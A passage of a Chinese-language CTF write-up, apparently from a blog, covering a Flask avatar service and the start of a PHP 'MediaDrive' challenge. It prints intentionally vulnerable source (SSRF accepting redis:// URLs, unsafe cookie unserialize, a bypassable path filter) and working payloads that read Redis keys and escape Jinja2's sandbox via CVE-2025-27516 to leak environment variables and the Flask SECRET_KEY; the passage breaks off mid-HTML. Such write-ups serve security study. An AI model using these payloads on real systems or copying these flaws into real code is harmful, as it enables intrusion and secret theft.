class="string">&quot;tpl&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    rdb.<span class="built_in">set</span>(<span class="string">f&quot;tpl:<span class="subst">&#123;user&#125;</span>&quot;</span>, tpl[:<span class="number">5000</span>])</span><br><span class="line">    <span class="comment"># 限制 5000 字节</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;preview&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置头像 URL</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/avatar&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avatar_set</span>():</span><br><span class="line">    user = _get_user()</span><br><span class="line">    url = (request.form.get(<span class="string">&quot;avatar_url&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">    rdb.<span class="built_in">set</span>(<span class="string">f&quot;avatar_url:<span class="subst">&#123;user&#125;</span>&quot;</span>, url[:<span class="number">2000</span>])</span><br><span class="line">    <span class="comment"># 限制 URL 长度</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;dashboard&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新头像</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/avatar/refresh&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avatar_refresh</span>():</span><br><span class="line">    user = _get_user()</span><br><span class="line">    url = _get_avatar_url(user)</span><br><span class="line">    <span class="comment"># 获取头像URL</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;dashboard&quot;</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data, ctype, meta = fetch_resource(url)</span><br><span class="line">        <span class="comment"># 从远程获取资源</span></span><br><span class="line">        <span class="comment"># 这里可能存在 SSRF</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        rdb.<span class="built_in">set</span>(<span class="string">f&quot;avatarbin:<span class="subst">&#123;user&#125;</span>&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">        rdb.<span class="built_in">set</span>(<span class="string">f&quot;avatarctype:<span class="subst">&#123;user&#125;</span>&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>)</span><br><span class="line">        rdb.<span class="built_in">set</span>(<span class="string">f&quot;avatarupd:<span class="subst">&#123;user&#125;</span>&quot;</span>, <span class="string">&quot;fetch failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;dashboard&quot;</span>))</span><br><span class="line">    rdb.<span class="built_in">set</span>(<span class="string">f&quot;avatarbin:<span class="subst">&#123;user&#125;</span>&quot;</span>, data[:MAX_AVATAR])</span><br><span class="line">    <span class="comment"># 存储头像数据</span></span><br><span class="line">    rdb.<span class="built_in">set</span>(<span class="string">f&quot;avatarctype:<span class="subst">&#123;user&#125;</span>&quot;</span>, ctype[:<span class="number">120</span>])</span><br><span class="line">    rdb.<span class="built_in">set</span>(<span class="string">f&quot;avatarupd:<span class="subst">&#123;user&#125;</span>&quot;</span>, <span class="string">&quot;just now&quot;</span>)</span><br><span class="line">    rdb.<span class="built_in">set</span>(<span class="string">f&quot;avatarmeta:<span class="subst">&#123;user&#125;</span>&quot;</span>, <span class="built_in">str</span>(meta)[:<span class="number">500</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;dashboard&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取头像文件</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/avatar/file&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avatar_file</span>():</span><br><span class="line">    user = _get_user()</span><br><span class="line">    data, ctype, _ = _get_avatar_blob(user)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (ctype <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).startswith(<span class="string">&quot;image/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;Unsupported avatar content-type&quot;</span>, <span class="number">415</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;&quot;</span>, <span class="number">204</span>)</span><br><span class="line">    resp = make_response(data)</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Type&quot;</span>] = ctype</span><br><span class="line">    resp.headers[<span class="string">&quot;X-Content-Type-Options&quot;</span>] = <span class="string">&quot;nosniff&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预览页面</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/preview&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preview</span>():</span><br><span class="line">    user = _get_user()</span><br><span class="line">    tpl = _get_tpl(user)</span><br><span class="line">    avatar_url = _get_avatar_url(user)</span><br><span class="line">    avatar_data, avatar_ctype, avatar_updated = _get_avatar_blob(user)</span><br><span class="line">    avatar_ok = (avatar_ctype <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).startswith(<span class="string">&quot;image/&quot;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(avatar_data) &gt; <span class="number">0</span></span><br><span class="line">    <span class="comment"># 返回头像文本</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">avatar_raw_text</span>():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> (avatar_data[:<span class="number">2000</span>]).decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 返回头像 base64</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">avatar_raw_b64</span>():</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(avatar_data[:<span class="number">5000</span>]).decode(<span class="string">&quot;ascii&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rendered = render_user_template(</span><br><span class="line">            tpl,</span><br><span class="line">            name=user,</span><br><span class="line">            avatar_url=avatar_url,</span><br><span class="line">            avatar_ok=avatar_ok,</span><br><span class="line">            avatar_ctype=avatar_ctype <span class="keyword">or</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">            avatar_updated=avatar_updated <span class="keyword">or</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">            avatar_size=<span class="built_in">len</span>(avatar_data),</span><br><span class="line">            avatar_raw_text=avatar_raw_text,</span><br><span class="line">            avatar_raw_b64=avatar_raw_b64,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> TemplateError <span class="keyword">as</span> e:</span><br><span class="line">        rendered = (</span><br><span class="line">            <span class="string">f&quot;&lt;div class=&#x27;alert alert-danger&#x27;&gt;Template error: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&lt;/div&gt;&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;preview.html&quot;</span>,</span><br><span class="line">        user=user,</span><br><span class="line">        rendered=rendered,</span><br><span class="line">        tpl=tpl,</span><br><span class="line">        avatar_url=avatar_url,</span><br><span class="line">        avatar_ctype=avatar_ctype <span class="keyword">or</span> <span class="string">&quot;-&quot;</span>,</span><br><span class="line">        avatar_size=<span class="built_in">len</span>(avatar_data),</span><br><span class="line">        avatar_updated=avatar_updated <span class="keyword">or</span> <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试接口</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/debug/diag&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diag</span>():</span><br><span class="line">    meta = (rdb.get(<span class="string">f&quot;avatarmeta:<span class="subst">&#123;_get_user()&#125;</span>&quot;</span>) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;service&quot;</span>: (rdb.get(<span class="string">&quot;service_name&quot;</span>) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>),</span><br><span class="line">        <span class="string">&quot;redis&quot;</span>: <span class="string">&quot;127.0.0.1:6379&quot;</span>,</span><br><span class="line">        <span class="string">&quot;avatar_cache_hint&quot;</span>: <span class="string">&quot;Avatar is cached first. Non-image content won&#x27;t be shown as image.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta&quot;</span>: meta,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>utils.py</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">REDIS_HOST = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_redis</span>():</span><br><span class="line">    <span class="keyword">return</span> redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=<span class="number">0</span>, socket_timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#去除空值+去除空格，只允许字母数字和_ -，其他都替换为_，限制32字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_key</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    s = (s <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;guest&quot;</span></span><br><span class="line">    s = re.sub(<span class="string">r&quot;[^a-zA-Z0-9_\-]&quot;</span>, <span class="string">&quot;_&quot;</span>, s)[:<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">return</span> s <span class="keyword">or</span> <span class="string">&quot;guest&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_resource</span>(<span class="params">url: <span class="built_in">str</span>, timeout: <span class="built_in">float</span> = <span class="number">2.0</span></span>):</span><br><span class="line">    u = urlparse((url <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip())</span><br><span class="line">    scheme = (u.scheme <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).lower()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> scheme <span class="keyword">in</span> (<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>):</span><br><span class="line">        resp = requests.get(url, timeout=timeout, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">        ctype = resp.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>)</span><br><span class="line">        data = (resp.content <span class="keyword">or</span> <span class="string">b&quot;&quot;</span>)[:<span class="number">200000</span>]</span><br><span class="line">        <span class="keyword">return</span> data, ctype, &#123;<span class="string">&quot;scheme&quot;</span>: scheme, <span class="string">&quot;status&quot;</span>: resp.status_code&#125;</span><br><span class="line"><span class="comment">#redis以/拆分db和key：redis://127.0.0.1:6379/0/test</span></span><br><span class="line"><span class="comment">#变成[&quot;0&quot;,&quot;test&quot;]</span></span><br><span class="line"><span class="comment">#db为0，key为test</span></span><br><span class="line">    <span class="keyword">if</span> scheme == <span class="string">&quot;redis&quot;</span>:</span><br><span class="line">        host = u.hostname <span class="keyword">or</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">        port = u.port <span class="keyword">or</span> <span class="number">6379</span></span><br><span class="line">        path = (u.path <span class="keyword">or</span> <span class="string">&quot;/&quot;</span>).lstrip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">        parts = path.split(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)</span><br><span class="line">        db = <span class="built_in">int</span>(parts[<span class="number">0</span>]) <span class="keyword">if</span> parts <span class="keyword">and</span> parts[<span class="number">0</span>].isdigit() <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        key = parts[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        r = redis.Redis(host=host, port=port, db=db, socket_timeout=<span class="number">1</span>)</span><br><span class="line">        val = r.get(key) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> val[:<span class="number">200000</span>], <span class="string">&quot;application/octet-stream&quot;</span>, &#123;<span class="string">&quot;scheme&quot;</span>: <span class="string">&quot;redis&quot;</span>, <span class="string">&quot;db&quot;</span>: db, <span class="string">&quot;key&quot;</span>: key&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;unsupported scheme&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>fetch_resource()</code> 支持两类协议：</p>
+<ul>
+<li><code>http/https</code>：直接 <code>requests.get()</code>，允许跟随跳转，最多取前 200000 字节。(<a target="_blank" rel="noopener" href="http://utils.py">utils.py</a>)</li>
+<li><code>redis://</code>：把 URL 解析成 <code>host/port/db/key</code>，然后直接 <code>r.get(key)</code> 读取 Redis 中的值并返回。(<a target="_blank" rel="noopener" href="http://utils.py">utils.py</a>)</li>
+</ul>
+<p>也就是说，这里存在两个能力：</p>
+<ul>
+<li><strong>HTTP SSRF</strong></li>
+<li><strong>Redis 任意 key 读取</strong></li>
+</ul>
+<p><code>/avatar/refresh</code> 会读取当前用户保存的 <code>avatar_url</code>，调用 <code>fetch_resource(url)</code>，然后把结果写进 Redis：</p>
+<ul>
+<li><code>avatarbin:&lt;user&gt;</code> 保存原始内容</li>
+<li><code>avatarctype:&lt;user&gt;</code> 保存类型</li>
+<li><code>avatarupd:&lt;user&gt;</code> 保存更新时间</li>
+<li><code>avatarmeta:&lt;user&gt;</code> 保存抓取元信息 <code>meta</code> (<a target="_blank" rel="noopener" href="http://app.py">app.py</a>)</li>
+</ul>
+<p>这里有个很关键的点：</p>
+<p><strong>即使抓到的内容不是图片，也会照样缓存。</strong></p>
+<p>只是 <code>/avatar/file</code> 在返回时要求 <code>Content-Type</code> 以 <code>image/</code> 开头，否则就报 415。(<a target="_blank" rel="noopener" href="http://app.py">app.py</a>)</p>
+<p><code>/preview</code> 会读取当前用户的模板 <code>tpl:&lt;user&gt;</code>，然后构造模板上下文。最危险的是这两个函数：</p>
+<ul>
+<li><code>avatar_raw_text()</code>：把缓存内容按 UTF-8 解码后返回前 2000 字节</li>
+<li><code>avatar_raw_b64()</code>：把缓存内容 base64 返回前 5000 字节 (<a target="_blank" rel="noopener" href="http://app.py">app.py</a>)</li>
+</ul>
+<p>然后模板通过 <code>render_user_template()</code> 用 Jinja2 <code>SandboxedEnvironment</code> 渲染。(<a target="_blank" rel="noopener" href="http://app.py">app.py</a>)</p>
+<p>尝试一下，把模板改为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>&#123;&#123; avatar_raw_text() &#125;&#125;<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后请求头像url为<code>http://www.baidu.com</code>，进行预览：<br />
+<img src="../images/image-20260326102439981.png" alt="image-20260326102439981" /></p>
+<p>成功ssrf</p>
+<p>这里我们可以请求redis：<code>redis://127.0.0.1:6379/0/avatarctype:admin</code>，尝试读取头像类型</p>
+<p><img src="../images/image-20260326102631915.png" alt="image-20260326102631915" /></p>
+<p>成功读取</p>
+<p>这里拿flag的话直接读<code>redis://127.0.0.1:6379/0/flag</code>就好了…谁知道flag在这里</p>
+<p><img src="../images/image-20260327111621750.png" alt="image-20260327111621750" /></p>
+<p>尝试第二个漏洞点模板注入进行RCE</p>
+<p>模板改为<code>&lt;pre&gt;&#123;&#123;7*7&#125;&#125;&lt;/pre&gt;</code></p>
+<p><img src="../images/image-20260327111242149.png" alt="image-20260327111242149" /></p>
+<p>回显49，存在模板注入漏洞，但是源码中存在<code>SandboxedEnvironment</code></p>
+<h4 id="jinja2绕过sandboxedenvironmentcve-2025-27516"><a class="markdownIt-Anchor" href="#jinja2绕过sandboxedenvironmentcve-2025-27516"></a> jinja2绕过SandboxedEnvironment(<strong>CVE-2025-27516</strong>)</h4>
+<p><code>SandboxedEnvironment</code> 旨在限制模板内可访问的属性与方法。其三层防御包括：拦截对双下划线属性（如 <code>__class__</code>）的访问、细粒度检查安全属性、以及返回 <code>Undefined</code> 对象静默失败。然而，<code>|attr</code> 过滤器在旧版本中存在缺陷。</p>
+<p>如果目标环境使用Jinja2 3.1.5或更低版本，还可以利用<strong>CVE-2025-27516</strong>进一步扩大战果。</p>
+<p>该漏洞的根因在于 |attr 过滤器的实现（filters.py中的do_attr函数）直接使用Python原生getattr获取属性值，而没有调用 env.getattr。这导致 |attr(“format”) 返回的是原始的str.format方法，绕过了SandboxedFormatter的安全包装。</p>
+<p>原始str.format方法内部的 Formatter.get_field 在遍历字段路径时使用Python原生的getattr和getitem，完全不经过sandbox的安全检查。因此可以通过format字符串的字段语法遍历任意Python属性链：</p>
+<p><code>&#123;&#123; "&#123;0.__globals__[os].environ&#125;"|attr("format")(lipsum) &#125;&#125;</code></p>
+<p>这条payload的执行过程：lipsum是<code>jinja2.utils.generate_lorem_ipsum</code>函数，其 <code>__globals__ </code>包含jinja2.utils模块的所有全局变量，其中就有os模块。format字符串中的<code> &#123;0.__globals__[os].environ&#125;</code> 字段访问不受沙箱限制，最终返回os.environ字典的字符串表示。</p>
+<p>需要注意的是，str.format只支持属性访问和索引操作，不支持函数调用。所以这条链只能做信息泄露（读取环境变量、SECRET_KEY、模块信息等），不能直接RCE。</p>
+<p>或者通过avatar_raw_text闭包的<code>__globals__</code>链泄露Flask应用的SECRET_KEY：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;&#123;0.__globals__[app].config[SECRET_KEY]&#125;&quot;|attr(&quot;format&quot;)(avatar_raw_text) &#125;&#125;</span><br><span class="line">#&#123;&#123; &quot;&#123;0.__globals__[os].environ&#125;&quot;|attr(&quot;format&quot;)(lipsum) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="mediadrive"><a class="markdownIt-Anchor" href="#mediadrive"></a> MediaDrive</h2>
+<h3 id="break-2"><a class="markdownIt-Anchor" href="#break-2"></a> break</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&quot;/lib/User.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&quot;/lib/Util.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$user</span> <span class="keyword">instanceof</span> User) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>), <span class="title function_ invoke__">time</span>() + <span class="number">86400</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = (<span class="keyword">string</span>)(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>] ?? <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$f</span> === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Missing parameter: f&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rawPath</span> = <span class="variable">$user</span>-&gt;basePath . <span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|\/flag|\.\.|php:|data:|expect:/i&#x27;</span>, <span class="variable">$rawPath</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Access denied&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$convertedPath</span> = @<span class="title function_ invoke__">iconv</span>(<span class="variable">$user</span>-&gt;encoding, <span class="string">&quot;UTF-8//IGNORE&quot;</span>, <span class="variable">$rawPath</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$convertedPath</span> === <span class="literal">false</span> || <span class="variable">$convertedPath</span> === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">500</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Conversion failed&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$convertedPath</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$content</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Not found&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$displayRaw</span> = <span class="variable">$rawPath</span>;</span><br><span class="line"><span class="variable">$displayConv</span> = <span class="variable">$convertedPath</span>;</span><br><span class="line"><span class="variable">$isText</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">min</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>), <span class="number">512</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$content</span>[<span class="variable">$i</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$c</span> === <span class="number">0</span>) &#123; <span class="variable">$isText</span> = <span class="literal">false</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>/&gt;</span><br><span class="line">  &lt;title&gt;Preview · MediaDrive&lt;/title&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/assets/style.css&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">app</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">header</span> <span class="title">class</span>=&quot;<span class="title">topbar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">brand</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">dot</span> <span class="title">red</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">dot</span> <span class="title">yellow</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">dot</span> <span 